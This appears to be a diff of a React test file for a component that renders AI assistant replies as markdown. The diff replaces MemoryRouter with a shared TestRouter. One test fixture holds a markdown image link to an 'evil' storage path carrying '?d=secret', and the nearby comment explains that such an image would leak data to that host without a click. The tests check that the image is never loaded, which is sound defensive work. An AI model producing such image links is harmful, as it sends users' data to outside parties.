@@ -1,5 +1,5 @@
+import { TestRouter } from "@trenova/shared/testing/test-router";
 import { cleanup, render, screen, waitFor } from "@testing-library/react";
-import { MemoryRouter } from "react-router";
 import { afterEach, describe, expect, it } from "vitest";
 import { AiMarkdown, StreamingAiMarkdown } from "../ai-markdown";
 
@@ -7,7 +7,7 @@ afterEach(cleanup);
 
 function renderReply(content: string, inRouter = true) {
   const reply = <AiMarkdown content={content} />;
-  render(inRouter ? <MemoryRouter>{reply}</MemoryRouter> : reply);
+  render(inRouter ? <TestRouter>{reply}</TestRouter> : reply);
 }
 
 describe("links in a reply", () => {
@@ -59,9 +59,9 @@ describe("images in a reply", () => {
   // would send whatever it put in the address to that host, unclicked.
   it("never loads an image, and offers it as a link to open deliberately", () => {
     const { container } = render(
-      <MemoryRouter>
+      <TestRouter>
         <AiMarkdown content="![rates](https://storage.googleapis.com/evil/x.png?d=secret)" />
-      </MemoryRouter>,
+      </TestRouter>,
     );
 
     expect(container.querySelector("img")).toBeNull();
@@ -72,9 +72,9 @@ describe("images in a reply", () => {
 
   it("names an image with no description rather than drawing nothing", () => {
     const { container } = render(
-      <MemoryRouter>
+      <TestRouter>
         <AiMarkdown content="![](https://example.com/a.png)" />
-      </MemoryRouter>,
+      </TestRouter>,
     );
 
     expect(container.querySelector("img")).toBeNull();
@@ -121,7 +121,7 @@ describe("a reply still streaming", () => {
   ].join("\n");
 
   function drawn(node: React.ReactNode): string {
-    const { container, unmount } = render(<MemoryRouter>{node}</MemoryRouter>);
+    const { container, unmount } = render(<TestRouter>{node}</TestRouter>);
     const html = container.innerHTML;
     unmount();
     return html;
